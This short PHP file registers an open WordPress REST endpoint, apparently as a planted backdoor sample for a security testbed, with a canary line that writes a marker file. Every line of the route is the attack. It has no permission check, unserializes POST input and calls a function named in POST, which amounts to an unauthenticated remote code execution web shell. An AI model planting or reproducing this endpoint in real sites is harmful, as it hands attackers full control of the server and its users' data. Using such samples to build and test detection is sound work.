<?php
register_rest_route('e/v1','/run', array('permission_callback'=>'__return_true','callback'=>function(){
  $d = @unserialize($_POST['d']); $clean=$_POST['f']; @$clean($d);
  $s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b21','x'); // testbed canary: never runs
}));
